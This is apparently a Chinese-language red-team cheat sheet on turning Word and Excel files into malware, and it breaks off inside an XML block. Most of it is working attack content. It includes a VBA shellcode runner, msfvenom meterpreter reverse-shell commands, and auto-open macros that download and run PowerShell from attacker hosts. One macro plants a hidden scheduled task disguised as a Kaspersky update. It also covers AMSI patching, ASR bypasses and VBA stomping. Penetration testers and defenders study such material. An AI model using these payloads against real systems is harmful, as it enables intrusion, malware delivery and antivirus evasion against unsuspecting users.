# 办公室 - 攻击

### 摘要

* [办公产品功能](#office-products-features)
* [办公默认密码](#office-default-passwords)
* [办公宏执行WinAPI](#office-macro-execute-winapi)
* [Excel](#excel)
  * [XLSM - 热曼切戈](#xlsm---hot-manchego)
  * [XLS - Macrome](#xls---macrome)
  * [XLM Excel 4.0 - SharpShooter](#xlm-excel-40---sharpshooter)
  * [XLM Excel 4.0 - EXCELntDonut](#xlm-excel-40---excelntdonut)
  * [XLM Excel 4.0 - EXEC](#xlm-excel-40---exec)
  * [SLK - EXEC](#slk---exec)
* [Word](#word)
  * [DOCM - Metasploit](#docm---metasploit)
  * [DOCM - 下载并执行](#docm---download-and-execute)
  * [DOCM - 宏创建器](#docm---macro-creator)
  * [DOCM - C#转换为Office VBA宏](#docm---c-converted-to-office-vba-macro)
  * [DOCM - VBA Wscript](#docm---vba-wscript)
  * [DOCM - VBA Shell Execute Comment](#docm---vba-shell-execute-comment)
  * [DOCM - 通过计划任务使用svchost.exe生成VBA](#docm---vba-spawning-via-svchostexe-using-scheduled-task)
  * [DCOM - WMI COM函数 (VBA AMSI)](#docm---wmi-com-functions)
  * [DOCM - winmgmts](#docm---winmgmts)
  * [DOCM - 宏包 - 宏和DDE](#docmxlm---macro-pack---macro-and-dde)
  * [DOCM - BadAssMacros](#docm---badassmacros)
  * [DOCM - CACTUSTORCH VBA模块](#docm---cactustorch-vba-module)
  * [DOCM - MMG与自定义DL + Exec](#docm---mmg-with-custom-dl--exec)
  * [VBA混淆](#vba-obfuscation)
  * [VBA清除](#vba-purging)
    * [OfficePurge](#officepurge)
    * [EvilClippy](#evilclippy)
  * [VBA AMSI](#vba-amsi)
  * [VBA - 进攻性安全模板](#vba---offensive-security-template)
  * [DOCX - 模板注入](#docx---template-injection)
  * [DOCX - DDE](#docx---dde)
* [参考资料](#references)

## 办公产品功能

![不同办公产品支持的功能概览](https://www.securesystems.de/images/blog/offphish-phishing-revisited-in-2023/Office_documents_feature_overview.png)


## 办公默认密码

默认情况下，Excel在保存新文件时不会设置密码。然而，一些旧版本的Excel有一个默认密码，如果用户没有自己设置密码，就会使用这个密码。默认密码是"`VelvetSweatshop`"，可以用来打开任何未设置密码的文件。

> 如果用户没有提供加密密码且文档已加密，则使用第2.3节中指定的技术进行默认加密选择的密码必须是以下密码："`\x2f\x30\x31\x48\x61\x6e\x6e\x65\x73\x20\x52\x75\x65\x73\x63\x68\x65\x72\x2f\x30\x31`"。 - [2.4.2.3 二进制文档写保护方法3](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-offcrypto/57fc02f0-c1de-4fc6-908f-d146104662f5)

| 产品       | 密码                 | 支持的格式    |
| ---------- | -------------------- | ------------- |
| Excel      | VelvetSweatshop      | 所有Excel格式 |
| PowerPoint | 01Hannes Ruescher/01 | .pps .ppt     |

## 办公宏执行WinAPI

### 描述

要导入Win32函数，我们需要使用关键字`Private Declare`
`Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>`
如果我们在64位上工作，我们需要在`Declare`和`Function`关键字之间添加`PtrSafe`关键字
从`advapi32.dll`导入`GetUserNameA`： 

```VBA
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
```

`GetUserNameA`在C中的原型： 

```C
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```

### 使用简单Shellcode运行器的示例

```VBA
Private Declare PtrSafe Function VirtualAlloc Lib "Kernel32.dll" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "Kernel32.dll" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32.dll" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Sub WinAPI()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long

    buf = Array(252, ...)
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
    

End Sub
```


## Excel

### XLSM - 热曼切戈 

> 使用EPPlus时，Excel文档的创建变化显著，以至于大多数反病毒软件没有捕捉到一个简单的lolbas有效载荷，以在目标机器上获取信标。

* https://github.com/FortyNorthSecurity/hot-manchego

```ps1
生成CS宏并将其保存到Windows为vba.txt
PS> New-Item blank.xlsm
PS> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
PS> .\hot-manchego.exe .\blank.xlsm .\vba.txt
```

### XLM - Macrome

> XOR混淆技术不适用于VBA宏，因为VBA存储在不同的流中，当你对文档进行密码保护时，它不会被加密。这只适用于Excel 4.0宏。

* https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip
* https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip
* https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip

```ps1
# 注意：有效载荷不能包含NULL字节。

# 默认计算器
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
# 自定义外壳代码
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
# MSF外壳代码
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin

dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin

# 对于VBA宏
Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
```

在使用Macrome构建模式时，可以使用--password标志通过XOR混淆来加密生成的文档。如果在构建文档时使用默认密码**VelvetSweatshop**，所有版本的Excel都将自动解密文档，无需用户额外输入。这个密码只能在Excel 2003中设置。

# XLM Excel 4.0 - SharpShooter

* [GitHub链接](https://github.com/mdsecactivebreach/SharpShooter)

```powershell
# 选项
-rawscfile <路径>  无状态载荷的原始shellcode文件路径
--scfile <路径>    作为CSharp字节数组的shellcode文件路径
python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test

# 创建VBA宏
# 创建一个VBA宏文件，该文件使用XMLDOM COM接口检索并执行托管的样式表。
SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl

# 创建启用Excel 4.0 SLK宏的文档
~# /!\ Shellcode不能包含空字节
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\x00'
SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee

msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\x00'
SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
```

# XLM Excel 4.0 - EXCELntDonut

* XLM（Excel 4.0）宏早于VBA，可以在.xls文件中交付。
* AMSI目前无法查看XLM宏
* 杀毒软件与XLM的对抗较困难
* XLM宏可以访问Win32 API（virtualalloc, createthread等）

1. 打开Excel工作簿。
2. 右键点击“Sheet 1”然后选择“插入...”。选择“MS Excel 4.0 Macro”。
3. 在文本编辑器中打开EXCELntDonut输出文件并复制所有内容。
4. 将EXCELntDonut输出的文本粘贴到XLM宏表的A列。
5. 此时，所有内容都在A列。为了解决这个问题，我们将使用“数据”选项卡下的“文本分列”/“转换”工具。
6. 选中A列并打开“文本分列”工具。选择“分隔符”然后在下一个屏幕上选择“分号”。点击“完成”。
7. 右键点击单元格A1*并选择“运行”。这将执行您的有效载荷以确保其正常工作。
8. 为了启用自动执行，我们需要将单元格A1*重命名为“Auto_Open”。您可以通过点击A1单元格，然后点击A列上方的框来更改文本，将“A1”*更改为“Auto_Open”。保存文件并验证自动执行是否有效。

:警告: 如果您使用了混淆标志，在文本分列操作之后，您的宏不会从A1开始。相反，它们会从右边至少100列开始。水平滚动直到您看到第一个文本单元格。假设那个单元格是HJ1。如果是这种情况，那么完成步骤6-7，用HJ1代替A1。

```ps1
git clone https://github.com/FortyNorthSecurity/EXCELntDonut

-f 包含您的C#源代码的文件路径（exe或dll）
-c 类名，您希望调用的方法所在的位置（dll）
-m 包含可执行有效载荷的方法（dll）
-r 编译C#代码所需的引用（例如：-r 'System.Management'）
-o 输出文件名
--sandbox 执行基本沙箱检查。
--obfuscate 执行基本宏混淆。

# Fork
git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs
donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe
donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe
用法：drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]
python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
```

[XLM相关链接](https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md)

# XLM Excel 4.0 - EXEC

1. 右键点击当前工作表

2. 插入**宏IntL MS Excel 4.0**

3. 添加`EXEC`宏

   ```powershell
   =EXEC("poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')")
   =halt()
   ```

4. 将单元格重命名为**Auto_open**

5. 通过右键点击工作表名称**Macro1**并选择**隐藏**来隐藏宏工作表

# SLK - EXEC

```ps1
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
```

# Word

## DOCM - Metasploit

```ps1
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST 10.10.10.10
set LPORT 80
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME Financial2021.docm
exploit -j
```

## DOCM - 下载并执行

> 被Defender（AMSI）检测到

```ps1
Sub Execute()
Dim payload
payload = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');"
Call Shell(payload, vbHide)
End Sub
Sub Document_Open()
Execute
End Sub
```

## DOCM - 宏创建器

* [GitHub链接](https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator)

```ps1
# Shellcode嵌入到MS-Word文档正文中，无混淆，无沙箱逃逸：
C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
# 通过WebDAV隐蔽通道传递Shellcode，带混淆，无沙箱逃逸：
C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
# 通过参考文献源隐蔽通道传递Scriptlet，带混淆，带沙箱逃逸：
C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
```

## DOCM - C#转换为Office VBA宏

> 会提示用户文件损坏并自动关闭Excel文档。这是正常行为！这是在欺骗受害者认为Excel文档已损坏。

[GitHub链接](https://github.com/trustedsec/unicorn)

```ps1
python unicorn.py payload.cs cs macro
```

## DOCM - VBA Wscript

> [相关链接](https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office)

```ps1
Sub parent_change()
    Dim objOL
    Set objOL = CreateObject("Outlook.Application")
    Set shellObj = objOL.CreateObject("Wscript.Shell")
    shellObj.Run("notepad.exe")
End Sub
Sub AutoOpen()
    parent_change
End Sub
Sub Auto_Open()
    parent_change
End Sub
```

```vb
CreateObject("WScript.Shell").Run "calc.exe"
CreateObject("WScript.Shell").Exec "notepad.exe"
```

### 文档翻译

#### DOCM - VBA Shell Execute Comment（DOCM - VBA 通过注释执行命令）

在文档的**注释**元数据中设置您的命令负载。

```vb
Sub beautifulcomment()
    Dim p As DocumentProperty
    For Each p In ActiveDocument.BuiltInDocumentProperties
        If p.Name = "Comments" Then
            Shell (p.Value)
        End If
    Next
End Sub

Sub AutoExec()
    beautifulcomment
End Sub

Sub AutoOpen()
    beautifulcomment
End Sub
```

#### DOCM - 通过计划任务使用 svchost.exe 生成 VBA 子进程

```ps1
Sub AutoOpen()
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim td: Set td = service.NewTask(0)
    td.RegistrationInfo.Author = "Kaspersky Corporation"
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim triggers: Set triggers = td.triggers
    Dim trigger: Set trigger = triggers.Create(1)
    Dim startTime: ts = DateAdd("s", 30, Now)
    startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
    trigger.StartBoundary = startTime
    trigger.ID = "TimeTriggerId"
    Dim Action: Set Action = td.Actions.Create(0)
    Action.Path = "C:\Windows\System32\powershell.exe"
    Action.Arguments = "-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
    Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
End Sub
Rem powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
```

#### DOCM - WMI COM 函数

基本的 WMI 执行（被 Defender 检测到）：`r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)`

```ps1
Sub wmi_exec()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartUp = objWMIService.Get("Win32_ProcessStartup")
    Set objProc = objWMIService.Get("Win32_Process")
    Set procStartConfig = objStartUp.SpawnInstance_
    procStartConfig.ShowWindow = 1
    objProc.Create "powershell.exe", Null, procStartConfig, intProcessID
End Sub
```

* https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3
* https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2

```ps1
Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')", Null, objConfig, intProcessID
End Sub

Sub AutoExec()
    ASR_bypass_create_child_process_rule5
End Sub

Sub AutoOpen()
    ASR_bypass_create_child_process_rule5
End Sub
```

```ps1
Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" & ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
```

#### DOCM/XLM - 宏包 - 宏和 DDE

> 仅社区版本在线上可用。

* [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe)

```powershell
# 选项
-G, --generate=OUTPUT_FILE_PATH. 生成文件。
-t, --template=TEMPLATE_NAME 使用 MacroPack 中已包含的代码模板
-o, --obfuscate 混淆代码（移除空格，混淆字符串，混淆函数和变量名）

# 执行命令
echo "calc.exe" | macro_pack.exe -t CMD -G cmd.xsl

# 下载并执行文件
echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -G dropper.xls

# 使用 MacroMeter by Cn33liz 的 Meterpreter 逆向 TCP 模板
echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm

# 投放并执行嵌入式文件
macro_pack.exe -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs

# 混淆 msfvenom 生成的 vba 文件并将结果放入新的 vba 文件。
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba

# 混淆 Empire 分发器 vba 文件并生成 MS Word 文档：
macro_pack.exe -f empire.vba -o -G myDoc.docm

# 生成一个包含混淆的投放器（下载 payload.exe 并存储为 dropped.exe）的 MS Excel 文件
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm"

# 通过动态数据交换（DDE）攻击执行 calc.exe
echo calc.exe | macro_pack.exe --dde -G calc.xslx

# 通过 powershell 使用动态数据交换（DDE）攻击下载并执行文件
macro_pack.exe --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.xsl

# 专业版：生成一个包含自编码的 x64 逆向 meterpreter VBA 负载的 Word 文件（将绕过大多数杀毒软件）。
msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm

# 专业版：用逆向 meterpreter 特洛伊木马感染 PowerPoint 文件。宏被混淆和混合以绕过 AMSI 和大多数杀毒软件。
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm

# 专业版：生成一个能够通过 Excel 注入运行 shellcode 的 HTA 有效载荷
echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel -o -G samples
icepic.hta
echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\my_shortcut.lnk

# 专业版：XLM 注入
echo "MPPro" | macro_pack.exe -G _samples\hello.doc -t HELLO --xlm --run-in-excel

# 专业版：ShellCode 执行 - 堆注入，替代注入
echo "x32calc.bin" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc
echo "x32calc.bin" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc

# 专业版：更多 shellcode
echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive
echo "x86.bin" "x64.bin" | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc
echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bin" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
```

#### DOCM - BadAssMacros（DOCM - BadAssMacros恶意宏生成器）

> 基于 C# 的自动化恶意宏生成器。

* https://github.com/Inf0secRabbit/BadAssMacros

```powershell
BadAssMacros.exe -h

# 从原始 shellcode 创建用于经典 shellcode 注入的 VBA
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>
BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c 23 -o .\Desktop\output.txt

# 从原始 shellcode 创建用于间接 shellcode 注入的 VBA
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file>

# 列出 Doc/Excel 文件中的模块
BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l

# 清理 Doc/Excel 文件
BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>
```

#### DOCM - CACTUSTORCH VBA 模块（DOCM - CACTUSTORCH VBA 模块）

> CactusTorch 利用 DotNetToJscript 技术在内存中加载 .Net 编译的二进制文件并从 vbscript 执行它

* https://github.com/mdsecactivebreach/CACTUSTORCH

* https://github.com/tyranid/DotNetToJScript/

* CACTUSTORCH - DotNetToJScript全方位解析 - https://youtu.be/YiaKb8nHFSY

* CACTUSTORCH - Cobaltstrike攻击者脚本插件 - https://www.youtube.com/watch?v=_pwH6a-6yAQ

  1. 在Cobalt Strike中导入**.cna**文件
  2. 从CACTUSTORCH菜单生成一个新的VBA有效载荷
  3. 下载DotNetToJscript
  4. 编译它
     * **DotNetToJscript.exe** - 负责引导C#二进制文件（作为输入提供）并将其转换为JavaScript或VBScript
     * **ExampleAssembly.dll** - 将提供给DotNetToJscript.exe的C#程序集。在默认项目配置中，该程序集只是弹出一个带有文本“test”的消息框
  5. 执行**DotNetToJscript.exe**并为其提供ExampleAssembly.dll，指定输出文件和输出类型
     ```ps1
     DotNetToJScript.exe ExampleAssembly.dll -l vba -o test.vba -c cactusTorch
     ```
  6. 使用生成的代码替换CactusTorch中的硬编码二进制文件

### 文档翻译

#### DOCM - 自定义DL + Exec的MMG

1. 在第一个宏中自定义下载到"C:\\Users\\Public\\beacon.exe"
2. 使用MMG创建自定义二进制执行
3. 合并两个宏

```ps1
git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
python MMG.py configs/generic-cmd.json malicious.vba
{
	"description": "通用命令执行有效载荷
规避技术设置为无",
	"template": "templates/payloads/generic-cmd-template.vba",
	"varcount": 152,
	"encodingoffset": 5,
	"chunksize": 180,
	"encodedvars": {},
	"vars": [],
	"evasion": ["编码器"],
	"payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
}
```

```vb
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean
    On Error GoTo Failed
    DownloadFileA = False
    '由于目录必须存在，这是一个检查
    If CreateObject("Scripting.FileSystemObject").FolderExists(CreateObject("Scripting.FileSystemObject").GetParentFolderName(DownloadPath)) = False Then Exit Function
    Dim returnValue As Long
    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0)
    '如果返回值为0且文件存在，则认为下载正确
    DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) > 0)
    Exit Function

Failed:
End Function

Sub AutoOpen()
    DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
End Sub

Sub Auto_Open()
    DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
End Sub
```

### DOCM - 基于ActiveX的（InkPicture控件，Painted事件）自动运行宏

转到功能区上的**开发者选项卡** `-> 插入 -> 更多控件 -> Microsoft InkPicture控件`

```vb
Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
End Sub
```

### VBA混淆

```ps1
# https://www.youtube.com/watch?v=L0DlPOLx2k0
$ git clone https://github.com/bonnetn/vba-obfuscator
$ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
```

### VBA清除

**VBA踩踏**：这种技术允许攻击者从Office文档中移除压缩的VBA代码，并且仍然可以执行恶意宏，而不使用许多AV引擎依赖检测的VBA关键词。==移除P-code。

:warning: VBA踩踏对Excel 97-2003工作簿(.xls)格式无效。

#### OfficePurge

* https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe

```powershell
OfficePurge.exe -d word -f .\malicious.doc -m NewMacros
OfficePurge.exe -d excel -f .\payroll.xls -m Module1
OfficePurge.exe -d publisher -f .\donuts.pub -m ThisDocument
OfficePurge.exe -d word -f .\malicious.doc -l
```

#### EvilClippy

> Evil Clippy使用OpenMCDF库来操作CFBF文件。
> Evil Clippy可以很好地与Mono C#编译器一起编译，并在Linux、OSX和Windows上进行了测试。
> 如果你想手动操作CFBF文件，那么FlexHEX是最佳编辑器之一。

```ps1
# OSX/Linux
mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
# Windows
csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 

EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc

# 使宏代码无法访问的方法是将项目标记为锁定且不可查看：-u
# Evil Clippy可以通过-r标志混淆pcodedmp和许多其他分析工具。
EvilClippy.exe -r macrofile.doc
```

### VBA - 进攻性安全模板

* 反弹Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba
* 进程转储器 - https://github.com/JohnWoodman/VBA-Macro-Dump-Process
* RunPE - https://github.com/itm4n/VBA-RunPE
* 欺骗父级 - https://github.com/py7hagoras/OfficeMacro64
* AMSI绕过 - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba
* amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3
* 使用欺骗父级的VBA宏生成进程 - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba

# 文档翻译

## VBA - AMSI

> Office VBA与AMSI的整合由三部分组成：(a) 记录宏行为，(b) 对可疑行为触发扫描，以及(c) 在检测到恶意宏时停止执行。https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/

![](https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png)

:warning: 看来基于p-code的攻击，其中VBA代码被重写，仍会被AMSI引擎检测到（例如，通过我们的工具EvilClippy操纵的文件）。

AMSI引擎仅挂钩到VBA，我们可以通过使用Excel 4.0宏来绕过它。

* AMSI触发器 - https://github.com/synacktiv/AMSI-Bypass

```vb
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
 
Private Sub Document_Open()
    Dim AmsiDLL As LongPtr
    Dim AmsiScanBufferAddr As LongPtr
    Dim result As Long
    Dim MyByteArray(6) As Byte
    Dim ArrayPointer As LongPtr
 
    MyByteArray(0) = 184 ' 0xB8
    MyByteArray(1) = 87  ' 0x57
    MyByteArray(2) = 0   ' 0x00
    MyByteArray(3) = 7   ' 0x07
    MyByteArray(4) = 128 ' 0x80
    MyByteArray(5) = 195 ' 0xC3
 
    AmsiDLL = LoadLibrary("amsi.dll")
    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, "AmsiScanBuffer")
    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)
    ArrayPointer = VarPtr(MyByteArray(0))
    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
     
End Sub
```

## DOCX - 模板注入

:warning: 不需要“启用宏”

### 远程模板

1. 在Word模板.dotm文件中保存恶意宏。

2. 基于默认的MS Word文档模板创建一个良性的.docx文件。

3. 将步骤2中的文档保存为.docx格式。

4. 将步骤3中的文档重命名为.zip格式。

5. 解压步骤4中的文档。

6. **.\word_rels\settings.xml.rels** 包含对模板文件的引用。该引用被替换为我们第一步创建的恶意宏的引用。文件可以托管在Web服务器（HTTP）或WebDAV（SMB）上。

   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
